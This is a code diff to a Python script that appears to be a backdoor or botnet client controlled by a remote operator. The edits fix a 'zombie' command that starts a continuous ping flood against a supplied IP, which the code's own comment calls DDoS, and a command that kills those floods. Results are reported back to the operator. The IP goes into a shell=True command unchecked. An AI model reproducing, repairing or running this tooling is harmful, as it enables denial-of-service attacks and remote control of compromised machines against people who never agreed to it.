@@ -196,12 +196,12 @@ def handle_communication():
         elif command[:6] == "zombie": # use ping command to create a zombie
             ip = command[7:]
             try:
-                subprocess.Popen(f"ping -t -l 32 {ip}", shell=True) # In real DDos attack, packet size is usually 65,000 bytes, but for demonstration purposes, we use 32 bytes.
+                subprocess.Popen(f"ping -t {ip} -l 32", shell=True) # In real DDos attack, packet size is usually 65,000 bytes, but for demonstration purposes, we use 32 bytes.
                 zombies.append((ip))
                 send_data(f"[+] Zombie created at {ip}")
             except:
                 send_data("[!!] Failed to create zombie!")
-        elif command[:10] == "kill_zombie":
+        elif command[:11] == "kill_zombie":
             try:
                 subprocess.Popen(f"taskkill /IM ping.exe /F", shell=True)
                 send_data(f"[+] All zombies killed!")
